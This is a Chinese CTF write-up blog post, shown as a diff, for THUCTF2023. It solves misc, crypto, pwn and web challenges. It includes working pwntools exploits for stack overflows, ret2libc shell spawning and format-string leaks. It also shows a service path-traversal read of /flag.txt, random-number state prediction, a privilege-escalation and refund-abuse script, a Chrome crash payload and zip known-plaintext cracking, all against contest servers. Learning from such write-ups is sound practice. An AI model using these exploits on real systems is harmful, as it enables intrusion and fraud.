@@ -1,0 +1,1921 @@
+---
+title: THUCTF2023 WriteUp
+date: 2023-10-13T17:04:54+08:00
+description: 我的 THUCTF2023（部分题目和 PKU GeekGame 3rd 相同）的 WriteUp。
+image: thuctf2023/poster.webp
+tags:
+-   writeup
+-   ctf
+---
+
+>   打 [THUCTF](https://thuctf.redbud.info/games/6/) 打的
+
+~~什么比谁 ddl 爆得多挑战赛（~~
+
+<Excerpt />
+
+## Misc
+
+### 一道难题
+
+base64 decode `aHR0cHM6Ly9kaXNjb3JkLmdnL1RZa1RNWkZnYiBvciBRUUdyb3VwOjUzNDg0MDcxOQ==` 得到 `https://discord.gg/TYkTMZFgb or QQGroup:534840719`。
+
+加入 Discord 得到 flag：
+
+![flag](thuctf2023/checkin-flag.png)
+
+### 猫咪状态监视器
+
+`/usr/sbin/service` 实际上是一个 shell 脚本，执行 `/etc/init.d` 里的服务，但可以 path traversal，使用 `service ../../bin/cat /flag.txt` 即可得到 flag。
+
+![flag](thuctf2023/sc-flag.png)
+
+### 麦恩·库拉夫特
+
+根据提示，flag 附近会有钻石块。使用 [uNmINeD](https://unmined.net/) 可以直接搜索到钻石块的位置：
+
+![搜索钻石块位置](thuctf2023/mc-unmined.png)
+
+#### Level 1
+
+tp 到钻石块位置即可看到：（或者也可以进入旁观模式然后通过透视来找火把）
+
+![flag1](thuctf2023/mc-flag1.png)
+
+#### Level 2
+
+tp 到钻石块位置即可看到：
+
+![flag2](thuctf2023/mc-flag2.png)
+
+#### Level 3
+
+tp 到钻石块位置可以看到磁带机和显示屏。显示屏的输入 / 磁带机的输出是每 4 bits 编码为红石信号的强度，可以在下图所示位置读取到：
+
+![读取红石信号强度](thuctf2023/mc-redstone.png)
+
+使用 <kbd>F3+I</kbd> 可以将当前指向方块的数据复制到剪贴板，利用这个 feature 可以自动读取数据。（感觉应该有更好的方法读取数据但我不会；当然也可以直接根据磁带机的结构读存档就不用执行了，但感觉分析磁带机结构也有点麻烦（
+
+```bash
+#!/bin/bash
+
+sleep 5
+
+echo > flag3.log
+
+while true; do
+    xdotool key F3+i
+    printf '%s %x\n' "$(date +%N)" "$(xsel -b -o | sed -E 's/.*power=([0-9]+).*/\1/g')" >> flag3.log
+done
+```
+
+但是这样读取会有一定的误差，通过记录时间戳并过采样可以一定程度上减小误差，但光是这样难以消除到合理的水平。可以在此基础上多采样几轮，相当于进行更多次的过采样，随后可以对每轮的结果取众数。我最后是读了 12 轮，大概 11 轮可以得到完全正确的文件，稍少几轮可以得到破损但能够识别出 flag 的图片。
+
+根据读取出的结果容易看出是一张 PNG，所以可以根据其 signature 来判断开头结尾进行分割。
+
+```python
+import codecs
+from rapidfuzz import fuzz
+
+result = []
+
+with open('flag3.log') as log:
+    lasttime = -1
+    last = ''
+    total_delta = 0
+    for line in log:
+        time, x = line.split()
+        time = int(time)
+        delta = 0 if lasttime == -1 else time - lasttime
+        if delta < 0:
+            delta += 1000000000
+        lasttime = time
+        total_delta += delta
+        if x != last:
+            result.append(x)
+            last = x
+        elif len(result) + 0.5 < total_delta / 200000000:
+            result.append(x)
+
+hex = ''.join(result)
+
+png_header_pos = []
+i = 0
+while True:
+    if fuzz.ratio(hex[i:i+8], '89504e47') > 80 and fuzz.ratio(hex[i:i+8], '89504e47') >= fuzz.ratio(hex[i+1:i+9], '89504e47'):
+        print(str(i).rjust(5), hex[i:i+160])
+        png_header_pos.append(i)
+        i += 100
+    i += 1
+    if i > len(hex) - 10:
+        break
+
+png_header_pos = png_header_pos[0:-1]
+
+fixed_hex = []
+
+for i in range(0, 4200):
+    options = []
+    for pos in png_header_pos:
+        options.append(hex[pos + i])
+    fixed_hex.append(max(set(options), key=options.count))
+
+fixed_hex = ''.join(fixed_hex).split('ae426082')[0] + 'ae426082'
+png = codecs.decode(fixed_hex, 'hex')
+open('flag3.png', 'wb').write(png)
+```
+
+得到的 PNG 如下：
+
+![flag3](thuctf2023/mc-flag3.png)
+
+### KFC
+
+使用 Google 搜索附件图片即可得到店名。
+
+![图片搜索](thuctf2023/kfc-search.png)
+
+![flag](thuctf2023/kfc-flag.png)
+
+### 未来磁盘
+
+#### Level 1
+
+gzip 使用 Deflate，而 Deflate stream 由多个 block 构成，可以找到位于中央、和其他 block 长得不一样的 block，它就是包含了 flag 的 block，可以将其解压而丢弃其他 block，循环进行这个过程直到得到 flag。
+
+解压出的东西需要进一步解压，此时可以通过枚举找到解压出的这个东西里一个 block 的开头。需要注意的是 Deflate stream 以 bit 而非 byte 为单位。数据中可能包含向前的引用，所以从中间一个 block 开始解压可能报错，可以在已经解压了开头若干 block 的基础上进行解压。总之实现起来很麻烦（，而且应该有哪不完善，不然 level 2 按理来说也能搞出来。
+
+运行下面的代码前需要先解压一遍得到内部一层的 gz 文件。
+
+```cpp
+#include <zlib.h>
+
+#include <cassert>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+
+using namespace std;
+
+const int CHUNK = 1 << 28;
+
+unsigned char in[CHUNK], out[CHUNK];
+
+int main()
+{
+    auto *s = new z_stream;
+    s->zalloc = Z_NULL;
+    s->zfree = Z_NULL;
+    s->opaque = Z_NULL;
+    s->avail_in = 0;
+    s->next_in = Z_NULL;
+    inflateInit2(s, -15);
+
+    FILE *input = fopen("gzip-flag1-2.gz", "rb");
+    fseek(input, 10, SEEK_SET);
+    s->avail_in = fread(in, 1, CHUNK, input);
+    fclose(input);
+    s->next_in = in;
+
+    z_stream foo;
+    foo.next_in = Z_NULL;
+
+    for (int round = 0; round < 2; ++round)
+    {
+        unsigned int commonHead = -1;
+
+        for (int t = 0;; ++t)
+        {
+            s->avail_out = CHUNK;
+            s->next_out = out;
+            const int ret = inflate(s, Z_BLOCK);
+
+            if (ret == Z_STREAM_END)
+                break;
+
+            if (ret != Z_OK)
+                printf("%d %d\n", t, ret);
+            assert(ret == Z_OK);
+
+            const int unused_bits = s->data_type & 7;
+            unsigned int head = s->next_in[-1] >> (8 - unused_bits);
+            unsigned char *nxt = s->next_in;
+            for (int i = 0; i < 4; ++i)
+                head |= nxt[i] << (i * 8 + unused_bits);
+            if (commonHead == -1)
+                commonHead = head;
+            else if (head != commonHead)
+            {
+                s->avail_out = CHUNK;
+                s->next_out = out;
+                assert(inflate(s, Z_BLOCK) == Z_OK);
+                printf("different head: %d %x %x\n", t, head, commonHead);
+                break;
+            }
+
+            if (unused_bits == 0 && foo.next_in == Z_NULL)
+                inflateCopy(&foo, s);
+        }
+
+        int len;
+
+        len = CHUNK - s->avail_out;
+        memcpy(in, out, len);
+
+        FILE *output = fopen("output", "wb");
+        fwrite(out, 1, len, output);
+        fclose(output);
+
+        int start = 0;
+
+        for (int offset = 0; offset < 8; ++offset)
+        {
+            for (int j = 0; j < 8000 && j < len; ++j)
+            {
+                if (j % 1000 == 0)
+                    printf("finding start: %d %d\n", offset, j);
+                inflateEnd(s);
+                delete s;
+                s = new z_stream;
+                inflateCopy(s, &foo);
+                s->next_in = in + j;
+                s->avail_in = len - j;
+                s->avail_out = CHUNK;
+                s->next_out = out;
+                if (inflate(s, Z_BLOCK) != Z_OK)
+                    continue;
+                if (CHUNK - s->avail_out < 10000)
+                    continue;
+                s->avail_out = CHUNK;
+                s->next_out = out;
+                if (inflate(s, Z_BLOCK) != Z_OK)
+                    continue;
+                if (CHUNK - s->avail_out < 10000)
+                    continue;
+                printf("start: %d %d %d %llx\n", j, CHUNK - s->avail_out, offset,
+                       *(unsigned long long *)out);
+                start = j;
+                break;
+            }
+            if (start)
+                break;
+            for (int i = 0; i < len; ++i)
+                in[i] = (in[i] >> 1) | ((in[i + 1] & 1) << 7);
+        }
+
+        if (start == 0)
+            exit(1);
+
+        inflateEnd(s);
+        inflateCopy(s, &foo);
+        s->next_in = in + start;
+        s->avail_in = len - start;
+    }
+}
+```
+
+![flag1](thuctf2023/gzip-flag1.png)
+
+### Dark Room
+
+#### Level 1
+
+通过手玩以及查看[源码](https://github.com/tinichu316/Dark_Room)，首先通关得知拿到 flag 需要 sanity 至少为 117%，这需要使用最优解通关并使用 help 命令进行一定的回复。可以将最优解记录下来然后自动尝试 help，在 sanity 足够高时自动通关获得 flag。
+
+```python
+from pwn import *
+import re
+
+count = 0
+max_sanity = 0
+
+while True:
+    sh = remote('chal.thuctf.redbud.info', 50630)
+    sh.sendlineafter(b'[...]:', b'newgame')
+    sh.sendlineafter(b'[...]:', b'ouuan')
+    sh.sendlineafter(b'(y/n)', b'y')
+    sh.sendlineafter(b'[ouuan]:', b'h')
+    sh.sendlineafter(b'[ouuan]:', b'h')
+    sh.sendlineafter(b'[ouuan]:', b'h')
+    sh.recvuntil(b'Sanity:')
+    sanity_line = sh.recvline().decode()
+    sanity = int(re.findall(r'\d+', sanity_line)[0])
+    count += 1
+    max_sanity = max(max_sanity, sanity)
+    print(sanity, max_sanity, count)
+    if sanity < 120:
+        sh.close()
+        continue
+    commands = '''n
+n
+e
+pickup key
+w
+s
+s
+e
+e
+e
+pickup trinket
+use trinket
+w
+s
+usewith key door
+s
+s
+n
+w
+w
+w
+n
+pickup key
+s
+e
+e
+e
+n
+n
+w
+w
+n
+n
+w
+w
+usewith key door
+n'''.split('\n')
+    for c in commands:
+        print(sh.recvuntil(b'[ouuan]:').decode())
+        print(c)
+        sh.sendline(c.encode())
+    sh.interactive()
+    break
+```
+
+![flag1](thuctf2023/darkroom-flag1.png)
+
+#### Level 2
+
+首先走到 FlagRoom，`getflag` 后输入非数字可以看到报错：
+
+```python
+    248:   while flag_number:
+    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    250:      if flag_number & 1:
+    251:          p = getStrongPrime(2048)
+    252:          q = getStrongPrime(2048)
+    253:      flag_number >> 1
+```
+
+其中 `getStrongPrime` 是一个耗时很长的操作，所以可以通过时间侧信道获取到 `flag_number`。
+
+```python
+from pwn import *
+import time
+
+sh = remote('chal.thuctf.redbud.info', 52124)
+sh.sendlineafter(b'[...]:', b'newgame')
+sh.sendlineafter(b'[...]:', b'ouuan')
+sh.sendlineafter(b'(y/n)', b'y')
+
+commands = '''n
+n
+w
+w
+s
+getflag'''.split('\n')
+
+for c in commands:
+    print(sh.recvuntil(b'[ouuan]:').decode())
+    print(c)
+    sh.sendline(c.encode())
+
+result = ""
+current = 0
+bit = 0
+
+while True:
+    sh.sendlineafter(b"number): ", b"1")
+    start = time.time()
+    sh.recvline()
+    end = time.time()
+    if end - start > 0.5:
+        current = current + (1 << bit)
+    if bit == 7:
+        result = chr(current) + result
+        print(result)
+        if result.startswith("HUCTF{"):
+            break
+        current = 0
+        bit = 0
+    else:
+        bit += 1
+
+sh.interactive()
+```
+
+![flag2](thuctf2023/darkroom-flag2.png)
+
+### Huavvei Mate
+
+#### Level 1
+
+首先将每块的图片下载下来，进行拼图而不是真的华容道。我是手动在 GIMP 里拼的。可以参考 [QR Code Tutorial - Thonky.com](https://www.thonky.com/qr-code-tutorial/) 和 [QR code - Wikipedia](https://en.wikipedia.org/wiki/QR_code)，并使用 [QRazyBox](https://merri.cx/qrazybox/) 辅助。
+
+1.  把 finder pattern 拼出来。
+2.  把 timing pattern 拼出来。
+3.  把 alignment pattern 的主体部分拼上。
+4.  查表得知 ECC level 为 L，mask pattern 为 3。根据 flag 格式可以得知 input mode 是 byte，开头几个字符是 `THUCTF{`，据此可以把最右边拼出来。
+5.  剩下的可以逐块进行尝试，保证得到的是可见字符（而且最好有一定语义）。
+
+最后得到二维码如下，扫码得到 flag。
+
+![qrcode](thuctf2023/huavvei-hard-qrcode.png)
+
+### 基本功
+
+#### Level 1
+
+附件的文件名提示了需要使用 [bkcrack](https://github.com/kimci86/bkcrack)，即使用已知的部分明文来攻击不安全的 Zip 加密方式。
+
+根据压缩包内已知的文件名 `chromedriver_linux64.zip` 和文件大小，在 https://chromedriver.storage.googleapis.com/index.html 进行搜索，发现是 89.0.4389.23。
+
+下载后按照 bkcrack 的说明即可破解密码得到 flag。
+
+![flag1](thuctf2023/bkcrack-flag1.png)
+
+#### Level 2
+
+根据 pcapng 的固定不变的文件头（参考 [PCAP Next Generation Dump File Format](https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html#sectionshb)，也可以自己存一个和 forensics 的附件进行对比）即可得到已知明文。因为中间有一个可变的 block length，需要使用 `bkcrack` 的 `-x` 选项提供分段的明文。
+
+`signature.pcapng`: `0a 0d 0d 0a`
+
+```bash
+bkcrack -C bkcrack_level2.zip -c flag.pcapng -P level2-known-plain.zip -p signature.pcapng -x 6 00004d3c2b1a01000000ffffffffffffffff
+```
+
+![flag2](thuctf2023/bkcrack-flag2.png)
+
+## Crypto
+
+### easycrypto
+
+#### Level 1
+
+将 `cipher.txt` 输入到 https://quipqiup.com/ 即可得到 flag。
+
+![flag1](thuctf2023/easycrypto-flag1.png)
+
+#### Level 2
+
+通过反编译以及运行可以看出，`main` 是把 flag 按 `table.txt` 作为字母表进行 base64 编码，并在最后输出字母表的第一位（即 `A` 的密文）。
+
+根据 level 1 可以得到一部分的密文对应关系，再根据 flag 的开头是 `THUCTF{` 可以再得到一些。剩下的可以随机尝试直到试出符合格式条件的 flag。
+
+```python
+import re
+import string
+import random
+from base64 import b64decode
+
+plaintext  = "You are right, but The Legend of Zelda is an action-adventure game franchise created by the Japanese game designers Shigeru Miyamoto and Takashi Tezuka. It is primarily developed and published by Nintendo, although some portable installments and re-releases have been outsourced to Flagship, Vanpool, and Grezzo. The gameplay incorporates action-adventure and elements of action RPG games. THUCTF{cryptography_is_interesting} VEhVQ1RGe A"
+ciphertext = "Xzi rmc mbdga, nia Agc Qcdcjy zl Ocqyr bw rj rpabzj-rytcjaimc drsc lmrjpgbwc pmcracy nx agc Erurjcwc drsc ycwbdjcmw Wgbdcmi Sbxrszaz rjy Arkrwgb Acoikr. Ba bw umbsrmbqx yctcqzucy rjy uinqbwgcy nx Jbjacjyz, rqagzidg wzsc uzmarnqc bjwarqqscjaw rjy mc-mcqcrwcw grtc nccj ziawzimpcy az Lqrdwgbu, Trjuzzq, rjy Dmcooz. Agc drscuqrx bjpzmuzmracw rpabzj-rytcjaimc rjy cqcscjaw zl rpabzj MUD drscw. AGIPAL{pmxuazdmrugx_bw_bjacmcwabjd} TCgTV1MDc R"
+encoded = "TCgTV1MDc0qlSAN1S182XHSoXeM9"
+table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+while True:
+    d = {}
+    revd = {}
+    unused = set(table[:52])
+
+    for i in range(len(ciphertext)):
+        if plaintext[i] in string.ascii_letters:
+            d[plaintext[i]] = ciphertext[i]
+            revd[ciphertext[i]] = plaintext[i]
+            if ciphertext[i] in unused:
+                unused.remove(ciphertext[i])
+
+    new_table = {}
+    r = [i for i in range(52)]
+    random.shuffle(r)
+    for i in r:
+        if table[i] in d:
+            new_table[i] = d[table[i]]
+        else:
+            new_table[i] = unused.pop()
+            revd[new_table[i]] = table[i]
+
+    new_table = [new_table[i] for i in range(52)]
+    new_table = "".join(new_table) + table[52:]
+
+    encoded_decrypted = "".join([revd[x] if x in revd else x for x in encoded])
+    try:
+        flag = b64decode(encoded_decrypted).decode()
+    except:
+        continue
+    if re.match('THUCTF\\{[a-zA-Z0-9_]*\\}', flag):
+        print(flag, new_table)
+```
+
+![flag2](thuctf2023/easycrypto-flag2.png)
+
+### 小章鱼的 Cookie
+
+#### Level 1
+
+代码中使用了 Python 的 `random` 库，而其使用的 Mersenne Twister 算法是不安全的，基于连续 624 个 32-bit 输出就可以推测出接下来的输出，题目中正好提供了其生成的 2500 bytes，足以推测出后面的输出，再异或即可。
+
+```python
+from pwn import *
+from randcrack import RandCrack
+
+# sh = process(['python', 'cookie.py'])
+sh = remote('chal.thuctf.redbud.info', 50294)
+sh.sendline(b'1')
+
+sh.recvuntil(b'void*\n')
+b = bytes.fromhex(sh.recvline().strip().decode())
+
+rc = RandCrack()
+
+for i in range(0, 624 * 4, 4):
+    rc.submit(int.from_bytes(b[i:i+4], 'little'))
+
+for i in range(624 * 4, len(b), 4):
+    x = rc.predict_getrandbits(32)
+    print(bytes([p ^ q for p, q in zip(b[i:i+4], x.to_bytes(4, 'little'))]).decode(), end='')
+```
+
+![flag1](thuctf2023/cookie-flag1.png)
+
+#### Level 2
+
+阅读 Python 的 `random` 库[源码](https://github.com/python/cpython/blob/84b7e9e3fa67fb9b92088d17839d8235f1cec62e/Modules/_randommodule.c#L226-L232)，可以发现 seed 会被循环使用以补足到 624 个 32-bit，所以将拿到的 seed 重复两遍发回就可以 seed 不同但生成的序列相同，然后就和 level 1 一样了。
+
+```python
+from pwn import *
+from randcrack import RandCrack
+
+# sh = process(['python', 'cookie.py'])
+sh = remote('chal.thuctf.redbud.info', 50842)
+sh.sendline(b'2')
+
+sh.recvuntil(b'<')
+seed = sh.recvuntil(b'>')[:-1]
+sh.sendlineafter(b'>', seed * 2)
+
+sh.recvuntil(b'void*\n')
+b = bytes.fromhex(sh.recvline().strip().decode())
+
+rc = RandCrack()
+
+for i in range(0, 624 * 4, 4):
+    rc.submit(int.from_bytes(b[i:i+4], 'little'))
+
+for i in range(624 * 4, len(b), 4):
+    x = rc.predict_getrandbits(32)
+    print(bytes([p ^ q for p, q in zip(b[i:i+4], x.to_bytes(4, 'little'))]).decode(), end='')
+```
+
+![flag2](thuctf2023/cookie-flag2.png)
+
+#### Level 3
+
+这题有点..感觉应该不是 intended solution（不然无论是难度还是分类都不对（
+
+直接把所有 curse 发回会被 `input` 在一定长度处截断导致不符。但 `zip` 返回的长度是较短一方的长度，所以只发一个 seed 即可。
+
+```python
+from pwn import *
+
+# sh = process(['python', 'cookie.py'])
+sh = remote('chal.thuctf.redbud.info', 50846)
+sh.sendline(b'3')
+sh.recvuntil(b'<')
+curse = sh.recvuntil(b'>').split(b',')[0]
+sh.sendlineafter(b'>', curse)
+print(sh.recvall())
+```
+
+![flag3](thuctf2023/cookie-flag3.png)
+
+### Another V ME 50
+
+运行 & 阅读代码可知，password 是 username 加盐的 sha256 的末尾，获得 flag 就是要找到 hash collision，然后按提示注册登录 buy flag 即可。
+
+```python
+from hashlib import sha256
+
+PREFIX = b"CryptoUserInfo"
+def get_token(byte: bytes):
+    return sha256(PREFIX + byte).digest()[-7:]
+
+tokens = {}
+
+for i in range(1000000000):
+    token = get_token(str(i).encode())
+    if token in tokens:
+        print(i, tokens[token], token.hex())
+        break
+    tokens[token] = i
+```
+
+运行得到 collision `117361489 8567312 7797a591e9c707`。
+
+![flag](thuctf2023/anothervme50-flag.png)
+
+## Pwn
+
+### 测测你的网猫
+
+![flag](thuctf2023/nc-flag.png)
+
+### babystack
+
+#### Level 1
+
+反编译发现它看似限制了输入长度，但 `get_line` 函数的实现有问题，长度输入 0 即可减法溢出而没有长度限制。
+
+```c
+void get_line(long param_1, int param_2)
+{
+    char *__buf;
+    uint uVar1;
+
+    uVar1 = 0;
+    while (true)
+    {
+        if (param_2 - 1U <= uVar1)
+        {
+            return;
+        }
+        __buf = (char *)((ulong)uVar1 + param_1);
+        read(0, __buf, 1);
+        if (*__buf == '\n')
+            break;
+        uVar1 = uVar1 + 1;
+    }
+    *__buf = '\0';
+    return;
+}
+```
+
+栈溢出到返回地址，返回到 `backdoor` 即可 get shell，然后 `cat /flag` 获得 flag。
+
+```python
+from pwn import *
+
+# sh = process('./babystack')
+sh = remote('chal.thuctf.redbud.info', 50395)
+sh.sendlineafter(b'included!)', b'0')
+payload = p64(0x4011be) * 0x10
+sh.sendlineafter(b'string:', payload)
+sh.interactive()
+```
+
+![flag1](thuctf2023/babystack-flag1.png)
+
+#### Level 2
+
+代码中 `printf` 的 format string 可控制，从而可以泄露出 libc 的地址，然后就可以 ret2libc。
+
+`/bin/sh`、`system`、`pop %rdi` 的地址是用 `objdump` 在 `libc.so.6` 里找到的，`offset` 以及 `%25$p` 可以运行一下试出来。
+
+```python
+from pwn import *
+
+binsh = 0x1d8698
+system = 0x508f2
+poprdi = 0x2a3e5
+offset = -0x29d90
+
+# sh = process(['./ld-linux-x86-64.so.2', './childrenstack'], env={"LD_PRELOAD": "./libc.so.6"})
+sh = remote('chal.thuctf.redbud.info', 52087)
+sh.sendlineafter(b"(less than 0x20 characters)", b"%25$p")
+sh.recvuntil(b"flag:")
+libc = int(sh.recvuntil(b"What will you do").decode().split("What will you do")[0].strip(), 16) + offset
+sh.sendlineafter(b"capture it?:", b'a' * 0x78 + p64(libc + poprdi) + p64(libc + binsh) + p64(libc + system))
+sh.interactive()
+```
+
+![flag2](thuctf2023/babystack-flag2.png)
+
+#### Level 3
+
+被 hint 拐去学了一下 format string 写，结果试了下用和 level 2 一样的做法就能过，感觉 unintended 了（
+
+```python
+from pwn import *
+
+binsh = 0x1d8698
+system = 0x508f2
+poprdi = 0x2a3e5
+offset = -0x29d90
+
+# sh = process(['./ld-linux-x86-64.so.2', './teenagerstack'], env={"LD_PRELOAD": "./libc.so.6"})
+sh = remote('chal.thuctf.redbud.info', 52251)
+sh.sendlineafter(b"(less than 0x20 characters)", b"%21$p")
+sh.recvuntil(b"flag:")
+start = int(sh.recvline().decode().strip(), 16) + offset
+sh.sendlineafter(b"capture it?:", b'a' * 0x78 + p64(start + poprdi) + p64(start + binsh) + p64(start + system))
+sh.sendlineafter(b"again? :", b"a")
+sh.interactive()
+```
+
+![flag3](thuctf2023/babystack-flag3.png)
+
+### 初学 C 语言
+
+#### Level 1
+
+代码中 `printf` 的 format string 可控制，从而可以通过 `%llx %llx %llx ... %llx` 或 `%7$llx` 读取到栈上的数据。
+
+```python
+from pwn import *
+
+# sh = process('./pwn')
+sh = remote('chal.thuctf.redbud.info', 50296)
+
+for i in range(10, 50):
+    sh.sendlineafter(b'instruction:', f'llx:%{i}$llx'.encode())
+    sh.recvuntil(b'llx:')
+    line = sh.recvline().strip()
+    if len(line) % 2 == 1:
+        line = b'0' + line
+    line = bytes.fromhex(line.decode())
+    print(i, line[::-1]) # convert endian
+```
+
+![flag1](thuctf2023/c-flag1.png)
+
+## Web
+
+### 简单的打字稿
+
+<Card type="info" title="unintended solution">
+
+隔壁 GeekGame 的 flag 是 `flag{.+}`，用下面的做法会因为输出含 `flag` 而“绷”，但 THUCTF 的 flag 里不含 `flag`（
+
+</Card>
+
+#### Level 1
+
+触发 `flag1` 的类型错误，查看错误信息即可。
+
+```typescript
+function f(a: flag1): null {
+  return a;
+}
+```
+
+![flag1](thuctf2023/ts-flag1.png)
+
+#### Level 2
+
+同样是触发类型错误，由于类型较为复杂，获取到内部类型需要对 TypeScript 有更多的了解。主要难点在于整个输出有长度限制。在本地查看错误信息可以发现，错误信息中包含类型以及对应的源代码那一行，所以可以从这两方面来缩短错误信息长度，一是使用名字短的类型 `any`，二是将报错的那一行缩短为只有单个字符 `(`。
+
+```typescript
+function f(c: flag2) {
+  if (!('prototype' in c)) return;
+  const v = (new c()).v();
+
+  v(
+(
+    a: any, b: any): null => {
+      return null;
+  });
+}
+```
+
+![flag2](thuctf2023/ts-flag2.png)
+
+### Chrone
+
+#### Level 1
+
+将 query string 设得非常长，可以触发 431 Request Header Fields Too Large 错误，而在 Chrome 中，此时标签页的地址会被设为 `chrome-error://chromewebdata/`，就达到了题目要求的效果。
+
+payload 可以是 `/note?text=i_want_flag1i_want_flag1……i_want_flag1`，加长到报错为止。
+
+![flag1](thuctf2023/chrone-flag1.png)
+
+#### Level 2
+
+根据提示，需要在这个 `chrome-error://chromewebdata` 插入 DOM 元素让整个浏览器 crash。
+
+测试的时候可以用 Chrome 开一个 431 的标签页然后在 devtool 运行 JS。试了下发现插入 `iframe` 可以让标签页 crash 但浏览器没有 crash。再尝试修改 `src`，发现 `src` 非空时不会 crash，但如果插入时非空，插入后再修改为空，就会 crash。代码为 `e=document.createElement('iframe'); e.src='http://localhost:8000/'; document.body.append(e); e.src=''`。
+
+最后要让 bot 执行代码，由于是多句代码，可以用 `eval` 变成一句。payload 为 `/note?js=eval(%22e%3Ddocument.createElement('iframe')%3B%20e.src%3D'http%3A%2F%2Flocalhost%3A8000%2F'%3B%20document.body.append(e)%3B%20e.src%3D''%22)&text=aaaaaaaaaa……`
+
+![flag2](thuctf2023/chrone-flag2.png)
+
+### V ME 50
+
+注册登录后可以在注释中看到 `role_change.php`，直接修改提示没有权限，但有一个 hidden field `id`，可以发现第一个注册的用户 id 是 2，第二个注册的是 3，猜测 1 是管理员，改为 1 即可成功修改权限。
+
+然后可以购买物品以及退款。试了下发现一个用户购买的物品可以被另一个用户退款，所以多注册几个用户退款到同一个用户就有钱买 flag 了。
+
+```python
+import requests
+
+url = "http://chal.thuctf.redbud.info:50970"
+
+session = requests.session()
+
+def register(username):
+    session.post(f"{url}/register.php", data={"username": username, "password": "1"})
+
+def login(username):
+    session.post(f"{url}/login.php", data={"username": username, "password": "1"})
+
+def changerole(username):
+    session.post(f"{url}/role_change.php", data={"username": username, "id": "1", "role": "1"})
+
+def buy(id):
+    session.get(f"{url}/goods_api.php?method=buy&id={id}")
+
+def refund(id):
+    session.get(f"{url}/refund.php?method=cancel&id={id}")
+
+def check(id):
+    print(session.get(f"{url}/goods_api.php?method=check&id={id}").text)
+
+for i in range(10):
+    u = str(i)
+    register(u)
+    login(u)
+    changerole(u)
+    buy(1)
+    buy(1)
+
+for i in range(1, 21):
+    refund(i)
+
+buy(2)
+check(21)
+```
+
+![flag](thuctf2023/vme50-flag.png)
+
+### Emodle
+
+#### Level 1
+
+由于答案不变，相当于可以进行无限次猜测。
+
+可以从 https://unicode.org/Public/emoji/ 下载 emoji 的 Unicode 列表，然后首先猜若干次确认哪些 emoji 出现了，然后对每个出现了的 emoji 猜一次全是这个 emoji 来确定其位置。
+
+```python
+import re
+import requests
+
+port = 50258
+url = f"http://chal.thuctf.redbud.info:{port}/level1"
+
+emojis = []
+
+with open("emoji-sequences.txt") as seq:
+    for line in seq:
+        if len(line) < 2 or line.startswith("#"):
+            continue
+        code = line.split()[0]
+        if ".." in code:
+            l, r = code.split("..")
+        else:
+            l, r = code, code
+        for i in range(int(l, 16), int(r, 16) + 1):
+            emojis.append(chr(i))
+
+
+emojis = "".join(set(emojis))
+
+
+def guess(g: str):
+    res = requests.get(url, params={"guess": g})
+    m = re.findall('results\\.push\\("([🟥🟨🟩]*)"\\)', res.text)[0]
+    result = []
+    for c in m:
+        if c == "🟥":
+            result.append("r")
+        elif c == "🟨":
+            result.append("y")
+        else:
+            result.append("g")
+    return result
+
+
+answer = ["?"] * 64
+charset = set()
+
+for i in range(0, len(emojis), 64):
+    res = guess(emojis[i : i + 64])
+    for j in range(64):
+        if i + j >= len(emojis):
+            break
+        if res[j] != "r":
+            charset.add(emojis[i + j])
+
+for e in charset:
+    res = guess(e * 64)
+    for j in range(64):
+        if res[j] == "g":
+            answer[j] = e
+
+print("".join(answer))
+```
+
+![flag1](thuctf2023/emodle-flag1.png)
+
+#### Level 2
+
+只猜 8 次基本上不可能猜出，需要转换思路。这是一道 Web 题，所以看看它 Web 的部分。注意到它有 session 功能，通过 Cookie 实现，而 Cookie 是 JWT，payload 解码出来就包含了答案。下面是一个例子：
+
+```
+eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM3Q1x1RDgzRFx1REM3QVx1RDgzRFx1REM3OFx1RDgzRFx1REM2MFx1RDgzRFx1REM3Q1x1RDgzRFx1REM2N1x1RDgzRFx1REM1Mlx1RDgzRFx1REM1OFx1RDgzRFx1REM1NVx1RDgzRFx1REM1Rlx1RDgzRFx1REM2MFx1RDgzRFx1REM1RFx1RDgzRFx1REM4Mlx1RDgzRFx1REM0OFx1RDgzRFx1REM4Nlx1RDgzRFx1REM3OVx1RDgzRFx1REM0OFx1RDgzRFx1REM3Qlx1RDgzRFx1REM2Nlx1RDgzRFx1REM2NFx1RDgzRFx1REMzRlx1RDgzRFx1REM4OVx1RDgzRFx1REM1Q1x1RDgzRFx1REM2MVx1RDgzRFx1REM1Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM0MVx1RDgzRFx1REM2QVx1RDgzRFx1REM4OVx1RDgzRFx1REM1NVx1RDgzRFx1REM3Q1x1RDgzRFx1REM2Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM0M1x1RDgzRFx1REM0MVx1RDgzRFx1REM4N1x1RDgzRFx1REMzQlx1RDgzRFx1REM2Mlx1RDgzRFx1REM2Nlx1RDgzRFx1REM0Mlx1RDgzRFx1REM1NVx1RDgzRFx1REM1OFx1RDgzRFx1REM3QVx1RDgzRFx1REM4Mlx1RDgzRFx1REM0MVx1RDgzRFx1REM3NFx1RDgzRFx1REM1RVx1RDgzRFx1REM4NVx1RDgzRFx1REM3RVx1RDgzRFx1REM4MFx1RDgzRFx1REM0Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM1QVx1RDgzRFx1REM1Nlx1RDgzRFx1REM3Nlx1RDgzRFx1REM1Rlx1RDgzRFx1REM4NVx1RDgzRFx1REM1QVx1RDgzRFx1REM4Nlx1RDgzRFx1REM1Q1x1RDgzRFx1REM0NFx1RDgzRFx1REM4M1x1RDgzRFx1REM3OFx1RDgzRFx1REM3NSJ9LCJuYmYiOjE2OTcyNzMwODMsImlhdCI6MTY5NzI3MzA4M30.CUW8AK66IkZkgs2qmFtZaK-YcaaGvPK8QYr8cssmLV4
+```
+
+```
